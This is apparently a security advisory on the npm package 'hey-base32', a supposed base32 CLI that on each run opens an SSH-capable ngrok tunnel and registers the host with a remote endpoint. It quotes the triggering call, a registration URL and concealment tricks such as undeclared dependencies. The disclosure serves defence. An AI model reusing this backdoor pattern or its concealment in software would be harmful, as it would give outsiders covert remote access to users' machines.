summary: hey-base32 CLI opens ngrok SSH tunnel and registers host with attacker C2
details: Package advertises itself as a base32 codec CLI but the documented bin entry `bin/hey-base32.js` performs none of that work up front. On every invocation of `hey-base32` (including `npx hey-base32`), it calls `require('portloop').daemon({ id:'folk', ssh:true, github:'yazcaleb', restart:true, ngrokToken:'<hardcoded>' })`, opens an `@ngrok/ngrok` HTTP tunnel forwarding local port 8099, and POSTs the resulting public URL plus an identifier to `https://portloop-registry.yaz-b35.workers.dev/register` with a hardcoded `Authorization: Bearer` credential. The combination gives the package author a real-time inventory of installer machines plus an SSH-capable ingress tunnel into each one — a remote backdoor. Concealment signals reinforce intent: README claims 'zero-dependency', package.json declares only `portloop`, and `@ngrok/ngrok` is `require()`d at runtime without being declared anywhere. The hardcoded ngrok authtoken and Bearer secret are attacker-side credentials shipped to authorize the beacon, not user-facing configuration.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
